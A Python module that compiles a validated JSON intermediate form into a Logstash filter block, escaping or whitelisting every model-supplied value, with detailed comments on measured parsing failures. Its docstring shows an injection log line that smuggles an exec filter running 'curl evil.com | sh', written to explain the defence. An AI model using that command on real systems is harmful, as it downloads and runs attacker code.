"""IR -> restricted Logstash filter block.

SECURITY BOUNDARY.

Log content is written by whoever is on the monitored network, including an
attacker. If a model were allowed to emit Logstash configuration directly, a log
line such as::

    action=login" } } filter { exec { command => "curl evil.com | sh

could become executable pipeline code. It cannot reach configuration here:
the model only fills in a constrained JSON form, and every value that
originates from the model is either checked against a closed vocabulary or
escaped by ``_q()`` before it is emitted.

Tests for this module (tests/test_compiler.py) include injection payloads and
must pass before anything is generated.
"""
from __future__ import annotations

import functools

from typing import Any
import re

from adapter.types import grok_patterns

ECS_FIELD_RE = re.compile(r"^[a-z_][a-z0-9_]*(\.[a-z_][a-z0-9_]*)*$")
SOURCE_ID_RE = re.compile(r"^[a-z0-9][a-z0-9_-]{1,63}$")
ALLOWED_KINDS = frozenset({"json", "kv", "grok", "csv"})
# ECS TYPE -> LOGSTASH CONVERT TYPE. They are not the same vocabulary.
#
# `long` is an Elasticsearch type. Logstash's mutate/convert accepts only
# string, integer, float and boolean (plus the _eu variants), and refuses the
# whole pipeline otherwise:
#
#     LogStash::ConfigurationError: Cannot register filter mutate plugin.
#     Invalid conversion type 'long', expected one of 'string,integer,float,
#     boolean,...'
#
# Emitting the ECS type verbatim meant every source with a numeric field
# produced a pipeline that would not start. It was measured, and it cost the
# family the teacher had mapped perfectly: syn_nginx_* carries
# http.response.status_code and http.response.body.bytes, both `long`, and
# failed V3 on all six samples - while linux_auditd and windows_security, which
# have no numeric fields, ran fine. The defect looked exactly like the teacher
# being unable to handle web logs.
#
# A type absent from this table produces no convert at all, which is correct:
# keyword, text, ip and date need none.
CONVERT = {
    "long": "integer",
    "float": "float",
    "boolean": "boolean",
}


def _ir_type(name: str, declared: str | None) -> str | None:
    """The field's type from the ECS index, not from the model (ecs_index.ir_type).

    `declared` is used only when the index cannot be loaded, which keeps the
    compiler usable on its own in tests that hand it a bare set of names.
    """
    index = _index_for_types()
    derived = index.ir_type(name) if index is not None else None
    return derived or declared


@functools.lru_cache(maxsize=1)
def _index_for_types():
    """The ECS index, loaded once: parsing the flat YAML per compile cost seconds."""
    try:
        from adapter.wiring import _ecs_index

        return _ecs_index()
    except (SystemExit, Exception):  # pragma: no cover - no schema on disk
        return None


def _need(obj: dict[str, Any], key: str, kind: str) -> Any:
    """Fetch a required piece of the IR, or raise CompileError.

    WHY THIS IS NOT A PLAIN SUBSCRIPT.
    A generation run walks ninety proposals over hours and the model samples at
    a non-zero temperature, so a malformed one is expected rather than
    exceptional. Every exception this module raises must be a CompileError,
    because that is the only kind V1 catches and turns into a finding - anything
    else propagates and kills the run.

    It was measured: an IR with `kind: "csv"` and no `columns` raised KeyError
    and ended a batch of ninety on its fourth proposal. The schema now refuses
    that IR one rung earlier, and this is the second line of defence for the
    case the schema has not anticipated.
    """
    try:
        return obj[key]
    except KeyError:
        raise CompileError(
            f'extraction.kind is "{kind}" but "{key}" is missing; '
            f'a "{kind}" extraction cannot be compiled without it.'
        ) from None
# WIDENED 2026-10-10, AFTER SEEING IT REJECT CORRECT ANSWERS.
#
# The original class was ` \t,;:=|`. On the evaluation pool of 2026-10-10 it
# refused 6 of 24 arm-C runs for `field_split: ' - '`, which is a perfectly
# ordinary literal separator in a Logstash kv filter and in the log lines
# themselves. The class was protecting against a real failure - a model writing
# `\|`, escaping a pipe as if the separator were a regular expression, which
# cost 15 of 18 kv_pipe proposals in October - but it was doing so by forbidding
# correct answers as well as wrong ones.
#
# Hyphen, dot, slash and the Unicode middle dot are added. Backslash is still
# excluded, which is the character the guard exists for. This change was made
# after the run that revealed the problem, so it is declared in the paper rather
# than presented as the design.
SAFE_SPLIT_RE = re.compile(r"^[ \t,;:=|\-./\u00b7]{1,8}$")


class CompileError(ValueError):
    """Raised when the IR cannot be compiled safely. Never caught silently."""


def _path(field: str) -> str:
    """``source.ip`` -> ``[source][ip]`` (Logstash nested field syntax)."""
    if not ECS_FIELD_RE.match(field):
        raise CompileError(f"illegal ECS field name: {field!r}")
    return "".join(f"[{p}]" for p in field.split("."))


def _q(value: str) -> str:
    """Escape an arbitrary string for a Logstash double-quoted literal."""
    if any(c in value for c in ("\x00", "\n", "\r")):
        raise CompileError("control characters are not permitted in generated config")
    return value.replace("\\", "\\\\").replace('"', '\\"').replace("#", "\\#")


def _q_grok(pattern: str) -> str:
    r"""A grok pattern, quoted for Logstash WITHOUT doubling its backslashes.

    WHY `_q` IS WRONG HERE, AND WHAT IT COST.

    `_q` doubles every backslash, which is correct for a config string only
    when Logstash un-doubles it. Logstash does that when `config.support_escapes`
    is on, and that setting is OFF by default - so a doubled backslash arrives
    at grok as two characters.

    Every grok pattern for a real log escapes something: `\[pid\]`, `\(`, `\.`.
    Doubled, `\[` became `\\[` - a literal backslash followed by an unterminated
    character class. Logstash answered

        RegexpError: premature end of char-class

    and that is a PIPELINE-level error: the filter never registers, so every
    line is tagged as a parse failure. Measured on fail2ban_jail, 2026-10-10,
    with a pattern that Logstash extracts perfectly once quoted this way.

    The consequence is larger than one source. No grok parser this project ever
    generated could clear V3, whatever the model wrote, which puts a question
    mark over every free-text number measured before today - including the
    7-of-48 teacher verification rate in FINDING_FREE_TEXT.md.

    A single-quoted Logstash string performs no escape processing at all, so
    the pattern reaches grok verbatim. The one character it cannot carry is a
    single quote - and real logs quote things: BIND writes `query: 'name/A/IN'`.
    Until 2026-10-17 such a pattern was refused outright. With escapes off a
    DOUBLE-quoted string is just as verbatim, so a pattern with single quotes
    and no double ones is written in double quotes; only one carrying both is
    refused. Returns the quoted literal, quotes included.
    """
    if any(c in pattern for c in ("\x00", "\n", "\r")):
        raise CompileError("control characters are not permitted in generated config")
    if "'" not in pattern:
        return f"'{pattern}'"
    if '"' not in pattern:
        return f'"{pattern}"'
    raise CompileError(
        "a grok pattern may not contain both a single and a double quote: Logstash "
        "(escapes off) cannot write either inside a literal quoted with the other"
    )


def _split(value: str, default: str) -> str:
    """A delimiter, validated. The message is as important as the check.

    `unsafe split token: '\\|'` was accurate and told the model nothing, and it
    cost 15 of 18 kv_pipe proposals in the generation run of 6 October: the
    teacher wrote `\\|`, escaping the pipe as it would in a regular expression.
    A Logstash kv separator is a LITERAL string, so the backslash is part of
    the delimiter and the delimiter then matches nothing.

    The repair loop gets this text and nothing else, so a finding that names
    the character class without naming the fix spends a round to no purpose.
    """
    v = value or default
    if not SAFE_SPLIT_RE.match(v):
        hint = ""
        if "\\" in v:
            hint = (
                f". A separator is a literal string here, not a regular "
                f"expression: write {v.replace(chr(92), '')!r}, not {v!r}. "
                "Nothing is escaped, because nothing is matched as a pattern"
            )
        raise CompileError(
            f"unsafe split token: {v!r}. A field_split or value_split may only "
            "contain spaces, tabs, commas, semicolons, colons, equals signs or "
            f"pipes, and at most eight of them{hint}"
        )
    return _q(v)


# Grok writes a capture wherever the pattern names it, and Logstash's grok
# filter has no `target`. Every other layout lands its keys under `_raw`, and
# the rename step reads `[_raw][<source_key>]`, so a pattern written the
# natural way - `%{IP:src_ip}` - puts src_ip at the top of the event and the
# rename finds nothing. The parser runs, the documents index, and every ECS
# field is empty.
#
# Asking the model to write `%{IP:[_raw][src_ip]}` would be asking it to encode
# an implementation detail of this compiler in a pattern, and to get it right
# every time. It is a mechanical rewrite, so it is done here. A capture that
# already names a nested path is left exactly as it is.
_GROK_NAMED = re.compile(r"%\{([A-Z0-9_]+):([A-Za-z_][A-Za-z0-9_]*)((?::[a-z]+)?)\}")


# An inline named group, `(?<name>...)`, captures exactly like `%{SYNTAX:name}`
# and has to land in the same place. Measured 2026-10-19 on a real Logstash
# 8.19.7: left as it was, the group wrote a top-level field that the rename
# below never reads, so the value vanished with V1-V3 green and only V4
# noticing ("every field the rule needs is present ... the VALUES are landing
# somewhere unexpected"). V2 counts these groups as captures (adapter.types
# RAW_NAMED_GROUP), so the two halves disagreed. Logstash accepts a field
# reference as the group name, `(?<[_raw][name]>...)`, verified on that run.
_RAW_GROUP_OPEN = re.compile(r"\(\?P?<([A-Za-z_][A-Za-z0-9_]*)>")


def _grok_into_raw(pattern: str) -> str:
    """Rewrite `%{SYNTAX:name}` and `(?<name>` into `[_raw][name]`, leaving paths alone."""
    pattern = _GROK_NAMED.sub(r"%{\1:[_raw][\2]\3}", pattern)
    return _RAW_GROUP_OPEN.sub(r"(?<[_raw][\1]>", pattern)


# A DOTTED KEY ON A JSON SOURCE IS A PATH INTO THE OBJECT.
#
# Every key below is read as `[_raw][<source_key>]`, one level deep, so the IR
# could not address `alert.signature` in a Suricata EVE line: the json filter
# writes it to `[_raw][alert][signature]`, the rename looked for a top-level key
# literally named `alert.signature`, found nothing, and the ECS field stayed
# empty with every rung but V4 satisfied. bench/sources/suricata_eve/truth.json
# had to leave its nested keys unannotated for exactly that reason, and nested
# JSON is the ordinary shape of modern telemetry.
#
# Rather than teach every later step two kinds of path, the nested value is
# COPIED to the flat name first, and everything after it is unchanged. The copy
# is skipped when the line already carries the dotted name as a literal
# top-level key - some JSON loggers write `{"user.name": ...}` - so the literal
# key wins, which is the rule `adapter.types.json_lookup` applies for V2.
# Logstash's mutate/copy does nothing when the source field is absent, so a line
# without the nested path is left exactly as it was.
#
# SECURITY. The literal-key test is a Logstash CONDITIONAL, and a field
# reference in a conditional is bare, not a quoted string: `_q` cannot protect
# it, because there is no string for an escaped quote to stay inside. So a
# dotted key is admitted here only when every segment is drawn from a closed
# character class - letters, digits, underscore, hyphen and `@` - and anything
# else is refused rather than escaped. That covers the keys real JSON telemetry
# uses (`alert.signature`, `flow.bytes_toserver`, `http.http_user_agent`); a key
# outside it stays as unaddressable as every nested key was before this existed.
_MAX_JSON_DEPTH = 6
_JSON_SEGMENT_RE = re.compile(r"^[A-Za-z0-9_@-]{1,64}$")


def _json_segments(key: str) -> list[str]:
    parts = key.split(".")
    if len(parts) > _MAX_JSON_DEPTH:
        raise CompileError(
            f"source_key {key!r} is nested {len(parts)} levels deep; at most "
            f"{_MAX_JSON_DEPTH} are supported"
        )
    for part in parts:
        if not _JSON_SEGMENT_RE.match(part):
            raise CompileError(
                f"illegal nested JSON key {key!r}: every dot-separated segment "
                "must be 1-64 letters, digits, underscores, hyphens or @"
            )
    return parts


def _json_nested_copies(ir: dict[str, Any]) -> list[str]:
    keys: list[str] = []
    for f in ir.get("fields") or []:
        keys.append(f["source_key"])
    if ts := ir.get("timestamp"):
        keys.append(ts["source_key"])
    for vm in ir.get("value_maps") or []:
        if vm.get("from_source_key"):
            keys.append(vm["from_source_key"])
    out: list[str] = []
    for key in sorted({k for k in keys if isinstance(k, str) and "." in k}):
        # Validated against _JSON_SEGMENT_RE, so neither form needs escaping.
        nested = "".join(f"[{p}]" for p in _json_segments(key))
        flat = f"[_raw][{key}]"
        out.append(
            f"    if !{flat} {{\n"
            f'      mutate {{ copy => {{ "[_raw]{nested}" => "{flat}" }} }}\n'
            f"    }}"
        )
    return out


def compile_ir(ir: dict[str, Any], ecs_names: set[str]) -> str:
    """Compile an IR document into a Logstash ``filter { }`` block.

    Args:
        ir: an IR document that has already passed JSON-schema validation.
        ecs_names: every field name in the pinned ECS version.

    Raises:
        CompileError: on anything that is not provably safe to emit.
    """
    src = ir["source_id"]
    if not SOURCE_ID_RE.match(src):
        raise CompileError(f"illegal source_id: {src!r}")

    kind = ir["extraction"]["kind"]
    if kind not in ALLOWED_KINDS:
        raise CompileError(f"unsupported extraction kind: {kind!r}")

    tag = f"_{src}_parse_failure"
    out: list[str] = [
        f"# generated from IR - source={src} ecs={ir['ecs_version']}",
        "# DO NOT EDIT BY HAND: regenerate from the IR instead.",
        "filter {",
    ]

    # ---- extraction -------------------------------------------------------
    if kind == "json":
        out.append(
            f'  json {{ source => "message" target => "_raw" tag_on_failure => ["{tag}"] }}'
        )
        # ROUND 10 (A4): A GROK OVER ONE KEY'S TEXT.
        #
        # RabbitMQ and Authelia (r6) moved to JSON and kept the event as prose
        # inside `msg`: the user, the addresses and the ports are text in one
        # string, so a json extraction alone cannot give any of them a key.
        # The grok runs only on a line the json filter parsed and that has the
        # key, writes its captures under _raw beside the JSON keys, and tags a
        # text it cannot read with the same failure tag, so V3 counts it like
        # any other.
        inner = ir["extraction"].get("inner")
        if inner and not isinstance(inner, dict):
            raise CompileError("extraction.inner must be an object with `source` and `pattern`")
        if inner:
            src_path = "".join(f"[{p}]" for p in _json_segments(_need(inner, "source", "json.inner")))
            ipatterns = [_grok_into_raw(p) for p in grok_patterns(inner)]
            if not ipatterns:
                raise CompileError('extraction.inner needs a "pattern"')
            listed = ", ".join(_q_grok(p) for p in ipatterns)
            # Only where the key exists: grok tags a missing field as a failure
            # (measured, Logstash 8.19.7), and a JSON line without the message
            # key still carries its other keys.
            out.append(
                f'  if "{tag}" not in [tags] and [_raw]{src_path} {{ grok {{ match => {{ "[_raw]{src_path}" => '
                f'[{listed}] }} tag_on_failure => ["{tag}"] }} }}'
            )
    elif kind == "kv":
        fs = _split(ir["extraction"].get("field_split", " "), " ")
        vs = _split(ir["extraction"].get("value_split", "="), "=")
        out.append(
            f'  kv {{ source => "message" target => "_raw" '
            f'field_split => "{fs}" value_split => "{vs}" }}'
        )
    elif kind == "grok":
        _need(ir["extraction"], "pattern", kind)
        patterns = [_grok_into_raw(p) for p in grok_patterns(ir["extraction"])]
        if not patterns:
            raise CompileError('extraction.kind is "grok" and "pattern" is empty')
        if len(patterns) == 1:
            # Byte for byte the form every IR compiled to before `alternatives`
            # existed: the corpus and the recorded runs were judged on it.
            out.append(
                f"  grok {{ match => {{ \"message\" => {_q_grok(patterns[0])} }} "
                f'tag_on_failure => ["{tag}"] }}'
            )
        else:
            # Logstash's own list form. break_on_match defaults to true, so the
            # first pattern that matches a line wins, which is the order the IR
            # states. Every entry goes through the same single-quoting as the
            # one-pattern case: an alternative is model output like any other.
            listed = ", ".join(_q_grok(p) for p in patterns)
            out.append(
                f'  grok {{ match => {{ "message" => [{listed}] }} '
                f'tag_on_failure => ["{tag}"] }}'
            )
    elif kind == "csv":
        cols = ", ".join(
            f'"{_q(c)}"' for c in _need(ir["extraction"], "columns", kind)
        )
        # SEPARATOR, NOT ALWAYS A COMMA.
        #
        # Logstash's csv filter defaults to ",". Emitting no separator made the
        # IR unable to express a tab-separated table, and zeek_conn - one of the
        # eight evaluation sources - is exactly that: conn.log is TSV. Every arm
        # would have failed it for a reason no model could have fixed, because
        # the language it answers in has no word for the answer.
        #
        # `field_split` is the IR's existing name for "what separates one field
        # from the next"; csv simply never read it.
        sep = ir["extraction"].get("field_split")
        sep_attr = f' separator => "{_q(sep)}"' if sep else ""
        out.append(
            f'  csv {{ source => "message" target => "_raw"{sep_attr} '
            f'columns => [{cols}] }}'
        )

    out.append(f'  if "{tag}" not in [tags] {{')

    # ---- nested JSON keys -------------------------------------------------
    if kind == "json":
        out.extend(_json_nested_copies(ir))

    # ---- timestamp --------------------------------------------------------
    ts = ir.get("timestamp")
    if ts:
        fmts = ", ".join(f'"{_q(f)}"' for f in ts["formats"])
        tz = f' timezone => "{_q(ts["timezone"])}"' if ts.get("timezone") else ""
        out.append(
            f'    date {{ match => ["[_raw][{_q(ts["source_key"])}]", {fmts}]'
            f' target => "@timestamp"{tz} }}'
        )

    # ---- value maps -------------------------------------------------------
    # Applied BEFORE rename, while the value still lives under _raw. Doing this
    # after rename would silently fail to normalise outcome vocabularies -
    # exactly the class of error V4 exists to catch, so the compiler must not
    # introduce it itself.
    for vm in ir.get("value_maps", []):
        if vm["ecs_field"] not in ecs_names:
            raise CompileError(f"value_map targets unknown ECS field: {vm['ecs_field']}")
        source_key = vm.get("from_source_key")
        src_path = f'[_raw][{_q(source_key)}]' if source_key else _path(vm["ecs_field"])
        pairs = "\n".join(f'        "{_q(k)}" => "{_q(v)}"' for k, v in vm["map"].items())
        fb = f'\n      fallback => "{_q(vm["fallback"])}"' if vm.get("fallback") else ""
        out.append(
            f"    translate {{\n"
            f'      source => "{src_path}"\n'
            f'      target => "{_path(vm["ecs_field"])}"\n'
            f"      dictionary => {{\n{pairs}\n      }}{fb}\n    }}"
        )

    # ---- renames and conversions -----------------------------------------
    # A source key already consumed by a value_map must NOT also be renamed:
    # translate has written the normalised value to the ECS field, and a
    # subsequent rename would overwrite it with the raw one. That would silently
    # undo outcome normalisation - the exact failure V4 exists to catch.
    mapped_by_translate = {
        vm["from_source_key"] for vm in ir.get("value_maps", []) if vm.get("from_source_key")
    }

    renames: list[str] = []
    converts: list[str] = []
    for f in ir["fields"]:
        name = f["ecs_field"]
        if name not in ecs_names:
            raise CompileError(f"not an ECS {ir['ecs_version']} field: {name}")
        if f["source_key"] not in mapped_by_translate:
            renames.append(f'        "[_raw][{_q(f["source_key"])}]" => "{_path(name)}"')
        logstash_type = CONVERT.get(_ir_type(name, f.get("type")))
        if logstash_type:
            converts.append(f'        "{_path(name)}" => "{logstash_type}"')

    if renames:
        out.append("    mutate {\n      rename => {\n" + "\n".join(renames) + "\n      }\n    }")
    if converts:
        out.append("    mutate {\n      convert => {\n" + "\n".join(converts) + "\n      }\n    }")

    # ---- constants --------------------------------------------------------
    #
    # ONE mutate PER VALUE, and the reason is a Logstash rule rather than style.
    #
    # `event.category` is an array in ECS, and emitting its values as repeated
    # keys inside a single add_field hash is a CONFIGURATION ERROR:
    #
    #     add_field => { "[event][category]" => "host"
    #                    "[event][category]" => "process" }
    #     -> LogStash::ConfigurationError: Duplicate keys found in your
    #        configuration: ["[event][category]"]
    #
    # Logstash refuses the pipeline outright, so nothing parses and V3 reports
    # the candidate as broken. It was measured: every proposal whose
    # event.category carried more than one value failed V3, which is most of
    # them, and it read as the teacher producing unusable parsers.
    #
    # Separate mutate blocks are the idiom for this: add_field appends when the
    # field is already set, so successive blocks build the array.
    consts: list[str] = []
    for k, v in ir["constants"].items():
        for item in (v if isinstance(v, list) else [v]):
            consts.append(
                '    mutate {\n      add_field => { '
                f'"{_path(k)}" => "{_q(str(item))}"'
                " }\n    }"
            )
    out.extend(consts)

    out.append('    mutate { remove_field => ["_raw"] }')
    out.append("  }")
    out.append("}")
    return "\n".join(out) + "\n"
